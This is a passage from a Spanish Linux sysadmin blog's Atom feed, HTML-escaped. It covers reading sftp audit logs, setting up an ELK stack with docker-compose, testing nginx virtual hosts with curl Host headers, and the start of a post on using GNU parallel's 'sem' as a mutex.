Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:31 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: realpath &lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: opendir &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: closedir &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:50 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:52 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: realpath &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:02:52 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: stat name &lt;span class="s2"&gt;&amp;quot;/archives&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:00 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: open &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt; flags WRITE,CREATE,TRUNCATE mode &lt;span class="m"&gt;0644&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:00 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: close &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt; bytes &lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; written &lt;span class="m"&gt;12&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: opendir &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: closedir &lt;span class="s2"&gt;&amp;quot;/archives/&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:10 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:12 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: lstat name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:12 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: remove name &lt;span class="s2"&gt;&amp;quot;/archives/testfile&amp;quot;&lt;/span&gt;
Nov &lt;span class="m"&gt;24&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:03:16 sftpserver internal-sftp&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: session closed &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nb"&gt;local&lt;/span&gt; user guest from &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;172&lt;/span&gt;.17.0.1&lt;span class="o"&gt;]&lt;/span&gt;
admin@sftpserver:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La lectura de estos &lt;em&gt;logs&lt;/em&gt; es todo un arte; solo quiero recalcar que las sesiones se indican mediante el PID del &lt;em&gt;internal-sftp&lt;/em&gt; y que las acciones son bastante descriptivas. En este caso solo hay una sesión que es la número 32.&lt;/p&gt;
&lt;p&gt;Si intentamos entender lo que se ha hecho en esta sesión, vemos que las acciones mas importantes son el &lt;em&gt;open/close&lt;/em&gt; de &lt;em&gt;testfile&lt;/em&gt;, en modo de escritura y tras escribir 12 &lt;em&gt;bytes&lt;/em&gt;. Poco después, en la misma sesión, se ha borrado el fichero. El resto de acciones se disparan cuando nos movemos por las carpetas.&lt;/p&gt;</content><category term="sftp"></category><category term="ssh"></category><category term="auditoría"></category></entry><entry><title>Acumulando los logs en un servidor centralizado con Kibana</title><link href="https://www.linuxsysadmin.ml/2017/01/acumulando-los-logs-en-un-servidor-centralizado-con-kibana.html" rel="alternate"></link><published>2017-01-16T10:00:00+01:00</published><updated>2017-01-16T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-16:/2017/01/acumulando-los-logs-en-un-servidor-centralizado-con-kibana.html</id><summary type="html">&lt;p&gt;Buscar en los &lt;em&gt;logs&lt;/em&gt; es fácil cuando tenemos una máquina de cada tipo, pero es una actividad muy poco gratificante cuando tenemos un número grande o variable de cada tipo. La mejor manera de tenerlos controlados es hacer que envíen sus &lt;em&gt;logs&lt;/em&gt; a un almacén central, para su fácil consulta …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Buscar en los &lt;em&gt;logs&lt;/em&gt; es fácil cuando tenemos una máquina de cada tipo, pero es una actividad muy poco gratificante cuando tenemos un número grande o variable de cada tipo. La mejor manera de tenerlos controlados es hacer que envíen sus &lt;em&gt;logs&lt;/em&gt; a un almacén central, para su fácil consulta.&lt;/p&gt;
&lt;p&gt;En este artículo se pretende dar a conocer una de estas soluciones de acumulación y búsqueda de &lt;em&gt;logs&lt;/em&gt;, conocida como &lt;strong&gt;ELK&lt;/strong&gt; (hace poco se renombró a &lt;strong&gt;Elastic Stack&lt;/strong&gt;). Se trata de un conjunto de servicios que cooperan para obtener una solución completa:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Elastic search&lt;/strong&gt;: se trata de la base de datos que almacena todos los &lt;em&gt;logs&lt;/em&gt; que se le envían.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Logstash&lt;/strong&gt;: Es un agente que envía los &lt;em&gt;logs&lt;/em&gt; de varias fuentes al &lt;strong&gt;elastic search&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kibana&lt;/strong&gt;: Es una interfaz gráfica que nos permite buscar &lt;em&gt;logs&lt;/em&gt; y dibujar bonitas gráficas, partiendo de los datos del &lt;strong&gt;elastic search&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Esquema de un ELK" src="https://www.linuxsysadmin.ml/images/the-elk-stack.jpg"&gt;&lt;/p&gt;
&lt;p&gt;De esto se puede deducir que vamos a necesitar una instancia de cada tipo, a excepción de &lt;strong&gt;logstash&lt;/strong&gt;, que debe ponerse en todos los servidores que recojan &lt;em&gt;logs&lt;/em&gt;. Se podría poner, por ejemplo, el &lt;strong&gt;elastic search&lt;/strong&gt; y el &lt;strong&gt;kibana&lt;/strong&gt; en una misma máquina, dedicada solamente al consumo de los &lt;em&gt;logs&lt;/em&gt; de todos los servidores productivos.&lt;/p&gt;
&lt;h2&gt;Un ejemplo rápido&lt;/h2&gt;
&lt;p&gt;Si miramos en &lt;a href="https://hub.docker.com/"&gt;DockerHub&lt;/a&gt;, podremos comprobar que las 3 piezas disponen de una imagen que las satisface. Eso nos va a ahorrar mucho tiempo, a costa de las particularidades de cada imagen.&lt;/p&gt;
&lt;p&gt;Vamos a poner todas las imágenes en el mismo servidor por economía, pero lo ideal sería un &lt;strong&gt;logstash&lt;/strong&gt; por servidor y otro servidor con &lt;strong&gt;elastic search&lt;/strong&gt; y &lt;strong&gt;kibana&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El primer paso es acondicionar la memoria que pueden usar nuestros procesos. Esto se hace porque el &lt;strong&gt;elastic search&lt;/strong&gt; consume mucha memoria y va a fallar iniciándose.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ sudo sysctl -w vm.max_map_count&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;262144&lt;/span&gt;
vm.max_map_count &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;262144&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La mayoría de imágenes funcionan bien de serie, pero no es el caso de &lt;strong&gt;logstash&lt;/strong&gt;, que necesita una configuraciṕon para indicar qué &lt;em&gt;logs&lt;/em&gt; recoger, las transformaciones que deben sufrir, y el destino al que ir. Más información en &lt;a href="https://www.elastic.co/guide/en/logstash/current/index.html"&gt;la documentación&lt;/a&gt;. De momento nos vamos a limitar a recoger todos los ficheros &lt;em&gt;.log&lt;/em&gt; recursivamente de la carpeta &lt;em&gt;/logs&lt;/em&gt;; esta va a ser un volumen de &lt;em&gt;/var/log&lt;/em&gt; del servidor real.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ cat logstash.conf 
input &lt;span class="o"&gt;{&lt;/span&gt;
  file &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;/logs/**/*.log&amp;quot;&lt;/span&gt;
    &lt;span class="nv"&gt;start_position&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;beginning&amp;quot;&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

output &lt;span class="o"&gt;{&lt;/span&gt;
  elasticsearch &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;hosts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;elasticsearch:9200&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para simplificar el despliegue, vamos a usar &lt;strong&gt;docker-compose&lt;/strong&gt;, con algunas variaciones interesantes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  elasticsearch:
    image: elasticsearch
    container_name: elasticsearch
    hostname: elasticsearch
  kibana:
    image: kibana
    container_name: kibana
    hostname: kibana
    ports:
      - &lt;span class="s2"&gt;&amp;quot;5601:5601&amp;quot;&lt;/span&gt;
  logstash:
    image: logstash
    container_name: logstash
    hostname: logstash
    volumes:
      - ./logstash.conf:/logstash.conf:ro
      - /var/log:/logs:ro
    user: root
    command: &lt;span class="o"&gt;[&lt;/span&gt;bash, -c, &lt;span class="s2"&gt;&amp;quot;logstash -f /logstash.conf&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se hace notar especialmente que publicamos el puerto del &lt;strong&gt;kibana&lt;/strong&gt;, para poderlo ver cómodamente en nuestro navegador. Aparte de esto, vamos a poner el fichero de configuración de &lt;strong&gt;logstash&lt;/strong&gt; como un volumen local, tal como la carpeta de &lt;em&gt;logs&lt;/em&gt;. Un último detalle es que modificamos el comando a ejecutar para que el &lt;em&gt;entrypoint&lt;/em&gt; que viene por defecto no nos fuerce el usuario &lt;em&gt;logstash&lt;/em&gt;, puesto que entonces no podríamos leer muchos de los &lt;em&gt;logs&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@styx:~/docker/elk$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;elk_default&amp;quot;&lt;/span&gt; with the default driver
Creating elasticsearch
Creating logstash
Creating kibana
gerard@styx:~/docker/elk$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos falta acceder a la interfaz del &lt;strong&gt;Kibana&lt;/strong&gt; en &lt;a href="http://localhost:5601/"&gt;http://localhost:5601/&lt;/a&gt; y disfrutar del resultado.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Frontend de Kibana" src="https://www.linuxsysadmin.ml/images/kibana-frontend.jpg"&gt;&lt;/p&gt;</content><category term="ELK"></category><category term="elastic search"></category><category term="logstash"></category><category term="kibana"></category><category term="logs"></category></entry><entry><title>Probando virtualhosts con cabeceras HTTP</title><link href="https://www.linuxsysadmin.ml/2016/12/probando-virtualhosts-con-cabeceras-http.html" rel="alternate"></link><published>2016-12-19T08:00:00+01:00</published><updated>2016-12-19T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-12-19:/2016/12/probando-virtualhosts-con-cabeceras-http.html</id><summary type="html">&lt;p&gt;Algunas veces tenemos que montar servidores web que responden con distinto contenido dependiendo del dominio. En estas ocasiones, es posible usar un servidor DNS local o incluso resolviendo los dominios mediante el fichero &lt;em&gt;/etc/hosts&lt;/em&gt;. Sin embargo, hay una forma fácil, elegante y que no requiere modificar configuraciones del sistema …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Algunas veces tenemos que montar servidores web que responden con distinto contenido dependiendo del dominio. En estas ocasiones, es posible usar un servidor DNS local o incluso resolviendo los dominios mediante el fichero &lt;em&gt;/etc/hosts&lt;/em&gt;. Sin embargo, hay una forma fácil, elegante y que no requiere modificar configuraciones del sistema.&lt;/p&gt;
&lt;p&gt;La idea es muy fácil: se trata de suministrar la cabecera &lt;em&gt;Host&lt;/em&gt; con el dominio que queramos consultar, y el servidor web se va a comportar como si hubiéramos pedido ese &lt;em&gt;virtualhost&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;El escenario de ejemplo&lt;/h2&gt;
&lt;p&gt;Supongamos que tenemos un servidor web &lt;strong&gt;nginx&lt;/strong&gt; (por poner algún ejemplo). Este servidor está configurado con dos &lt;em&gt;server&lt;/em&gt; (lo que en &lt;strong&gt;apache&lt;/strong&gt; se llama &lt;em&gt;virtualhost&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Ambos se limitan a servir contenido estático, de diferentes carpetas, con la configuración siguiente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/nginx/conf.d &lt;span class="c1"&gt;# cat server1&lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name server1&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/server1&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
/etc/nginx/conf.d &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y una configuración análoga para el otro &lt;em&gt;virtualhost&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/nginx/conf.d &lt;span class="c1"&gt;# cat server2&lt;/span&gt;
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name server2&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www/server2&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
/etc/nginx/conf.d &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por supuesto, vamos a poner contenido en las carpetas raíz de cada &lt;em&gt;virtualhost&lt;/em&gt;, para que podamos ver fácilmente lo que estamos sirviendo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/srv/www &lt;span class="c1"&gt;# cat server1/index.html &lt;/span&gt;
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
/srv/www &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y algo similar para el segundo dominio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/srv/www &lt;span class="c1"&gt;# cat server2/index.html &lt;/span&gt;
&amp;lt;p&amp;gt;This comes from server2&amp;lt;/p&amp;gt;
/srv/www &lt;span class="c1"&gt;# &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de aquí, se asume que el servidor está recargado y corriendo.&lt;/p&gt;
&lt;h2&gt;Como se hace&lt;/h2&gt;
&lt;p&gt;Podemos hacer una petición directa con las herramientas que nos parezcan adecuadas, por ejemplo, &lt;strong&gt;wget&lt;/strong&gt;, &lt;strong&gt;curl&lt;/strong&gt; o un navegador normal; el único requisito es que podamos añadir cabeceras, de forma nativa o mediante un &lt;em&gt;plugin&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La dirección IP usada es la que corresponda; incluso se puede usar &lt;em&gt;localhost&lt;/em&gt; si hacemos las pruebas desde la misma máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s http://192.168.1.48/
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como vemos, obtenemos un resultado... ¿Pero cuál?&lt;/p&gt;
&lt;p&gt;No podemos saber &lt;em&gt;a priori&lt;/em&gt; de que dominio vamos a obtener las páginas. En este caso obtuvimos &lt;em&gt;server1&lt;/em&gt; porque &lt;strong&gt;nginx&lt;/strong&gt; suministra el primero que lee en las configuraciones. Pero eso no nos sirve.&lt;/p&gt;
&lt;p&gt;Nosotros queremos probar todos los dominios, uno por uno, y posiblemente de forma automatizada. Así, por ejemplo, si queremos el dominio &lt;em&gt;server1&lt;/em&gt;, basta con indicarlo en la cabecera &lt;em&gt;Host&lt;/em&gt; de la petición. Se añade el ejemplo con &lt;strong&gt;curl&lt;/strong&gt;, pero debería poder hacerse con cualquier cliente HTTP, de acuerdo a la documentación.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s -H &lt;span class="s2"&gt;&amp;quot;Host: server1&amp;quot;&lt;/span&gt; http://192.168.1.48/
&amp;lt;h1&amp;gt;Hello from server1&amp;lt;/h1&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda pedir el otro dominio, y verificar que se nos está sirviendo &lt;em&gt;server2&lt;/em&gt;, demostrando que este truco funciona:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~$ curl -s -H &lt;span class="s2"&gt;&amp;quot;Host: server2&amp;quot;&lt;/span&gt; http://192.168.1.48/
&amp;lt;p&amp;gt;This comes from server2&amp;lt;/p&amp;gt;
gerard@sirius:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos que nuestros &lt;em&gt;virtualhosts&lt;/em&gt; funcionan como deben. A partir de aquí, podemos enriquecer las configuraciones de acuerdo a nuestras necesidades.&lt;/p&gt;</content><category term="curl"></category><category term="virtual hosts"></category></entry><entry><title>Semáforos en linux</title><link href="https://www.linuxsysadmin.ml/2016/11/semaforos-en-linux.html" rel="alternate"></link><published>2016-11-28T08:00:00+01:00</published><updated>2016-11-28T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-11-28:/2016/11/semaforos-en-linux.html</id><summary type="html">&lt;p&gt;Tras revisar un &lt;em&gt;bug&lt;/em&gt; de cierto proceso en &lt;em&gt;background&lt;/em&gt; de una aplicación en mi trabajo, vimos que saltaban dos ejecuciones simultáneas y los dos procesos interferían entre ellos. Implementar una exclusión mutua en el proceso era costoso, así que opté por hacerlo con un comando &lt;strong&gt;linux&lt;/strong&gt;, que descubrí por internet …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tras revisar un &lt;em&gt;bug&lt;/em&gt; de cierto proceso en &lt;em&gt;background&lt;/em&gt; de una aplicación en mi trabajo, vimos que saltaban dos ejecuciones simultáneas y los dos procesos interferían entre ellos. Implementar una exclusión mutua en el proceso era costoso, así que opté por hacerlo con un comando &lt;strong&gt;linux&lt;/strong&gt;, que descubrí por internet.&lt;/p&gt;
&lt;p&gt;La idea es que podemos asegurar que un comando o &lt;em&gt;script&lt;/em&gt; pase por un semáforo tal como lo entienden en procesos concurrentes; se marca una zona de exclusión en donde solo un número determinado de procesos pueden estar a la vez. En el caso concreto de un solo proceso, se conoce como un &lt;em&gt;mutex&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Así pues, si tenemos un disparador de eventos, como por ejemplo &lt;strong&gt;incron&lt;/strong&gt;, podemos evitar una avalancha de procesos disparados en un plazo de tiempo minúsculo, limitando el &lt;em&gt;stress&lt;/em&gt; causado a la carga del sistema, y evitando también, problemas derivados de que nuestro proceso no acepte concurrencia.&lt;/p&gt;
&lt;p&gt;Como ya va siendo habitual, vamos a empezar instalando el paquete que ofrece la utilidad &lt;em&gt;sem&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# apt-get install -y parallel
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  libalgorithm-c3-perl libarchive-extract-perl libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl libdata-section-perl libfcgi-perl
  libgdbm3 liblog-message-perl liblog-message-simple-perl libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl libmro-compat-perl libpackage-constants-perl
  libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl libsub-install-perl libterm-ui-perl libtext-soundex-perl
  libtext-template-perl perl perl-modules rename
Suggested packages:
  perl-doc libterm-readline-gnu-perl libterm-readline-perl-perl make libb-lint-perl libcpanplus-dist-build-perl libcpanplus-perl libfile-checktree-perl libobject-accessor-perl
Recommended packages:
  libarchive-tar-perl
The following NEW packages will be installed:
  libalgorithm-c3-perl libarchive-extract-perl libcgi-fast-perl libcgi-pm-perl libclass-c3-perl libclass-c3-xs-perl libcpan-meta-perl libdata-optlist-perl libdata-section-perl libfcgi-perl
  libgdbm3 liblog-message-perl liblog-message-simple-perl libmodule-build-perl libmodule-pluggable-perl libmodule-signature-perl libmro-compat-perl libpackage-constants-perl
  libparams-util-perl libpod-latex-perl libpod-readme-perl libregexp-common-perl libsoftware-license-perl libsub-exporter-perl libsub-install-perl libterm-ui-perl libtext-soundex-perl
  libtext-template-perl parallel perl perl-modules rename
&lt;span class="m"&gt;0&lt;/span&gt; upgraded, &lt;span class="m"&gt;32&lt;/span&gt; newly installed, &lt;span class="m"&gt;0&lt;/span&gt; to remove and &lt;span class="m"&gt;1&lt;/span&gt; not upgraded.
Need to get &lt;span class="m"&gt;6794&lt;/span&gt; kB of archives.
After this operation, &lt;span class="m"&gt;38&lt;/span&gt;.4 MB of additional disk space will be used.
...
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a partir también de un &lt;em&gt;script&lt;/em&gt; que tarde un tiempo (para darnos tiempo a probar cosas concurrentemente). Este es el &lt;em&gt;script&lt;/em&gt; que no debería tener dos ejecuciones concurrentes; recordamos que tiene permisos de ejecución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat do_stuff.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Started process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sleep &lt;span class="m"&gt;10&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Ended process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nada en especial; este &lt;em&gt;script&lt;/em&gt; recibe un parámetro para identificar la ejecución que estamos mirando, y lo único que hace es perder el tiempo (usad la imaginación), previo registro de la hora de comienzo y de final. La ejecución no depara sorpresas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# ./do_stuff.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:22:31 - Started process &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;14&lt;/span&gt;:22:41 - Ended process &lt;span class="m"&gt;1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Esperando en el semáforo&lt;/h2&gt;
&lt;p&gt;Como ya hemos mencionado, no nos interesaba que no ejecutaran mas de una vez concurrentemente. Para ello, vamos a disponer de un semáforo que deje pasar un solo proceso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@helium:~# cat protected_do_stuff.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +&lt;span class="s1"&gt;&amp;#39;%H:%M:%S&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Semaphore for process &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sem --fg --id semaphore_do_stuff -j &lt;span class="m"&gt;1&lt;/span&gt; /root/do_stuff.sh &lt;span class="nv"&gt;$1&lt;/span&gt;
root@helium:~# 
&lt;/pre&gt;&lt;/div&gt;


